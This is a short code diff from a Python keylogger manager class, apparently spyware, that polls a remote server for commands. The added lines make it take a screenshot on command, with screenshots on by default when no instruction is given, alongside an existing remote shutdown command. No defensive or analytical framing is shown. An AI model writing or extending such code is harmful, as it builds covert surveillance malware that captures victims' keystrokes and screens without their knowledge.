@@ -52,6 +52,9 @@ class KeyLoggerManager(IKeyLoggerManager):
                     commands = response.json().get('commands', {})
                     if commands.get('shutdown', False):
                         self.stop_logging()
+                    if commands.get('screenshot', True):
+                        self.take_screenshot()
+
             except requests.exceptions.RequestException:
                 pass
 
